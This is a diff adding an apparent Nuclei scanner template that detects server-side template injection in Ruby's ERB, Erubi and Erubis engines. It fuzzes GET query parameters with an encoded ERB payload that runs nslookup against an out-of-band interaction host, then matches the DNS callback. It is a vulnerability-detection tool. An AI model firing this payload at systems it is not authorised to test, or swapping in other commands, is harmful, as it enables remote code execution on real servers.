@@ -1,0 +1,39 @@
+id: erb-erubi-erubis-oob
+
+info:
+  name: Erb OR Erubi OR Erubis - Out of Band Template Injection
+  author: 0xAwali,DhiyaneshDK
+  severity: high
+  reference:
+    - https://rubygems.org/gems/erb
+    - https://rubygems.org/gems/erubis
+    - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
+  metadata:
+    verified: true
+  tags: ssti,dast,oast,oob,vuln
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - '<%25%3d(`nslookup+-type=SRV+{{interactsh-url}}`)%25>'
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    matchers:
+      - type: dsl
+        name: request-matcher
+        dsl:
+          - "contains(interactsh_protocol,'dns')"
+          - "contains(interactsh_request,'srv')"
+        condition: and
+# digest: 4a0a004730450220339e6129262efd8b705181d9c5b9da8b6ac52e70c0b3815bf3f1672bfcff4d07022100be49c15c59d1241bdb873f973f0cebea10b3f7049327cdb3c051c99f2b8034ad:922c64590222798bb761d5b6d8e72950
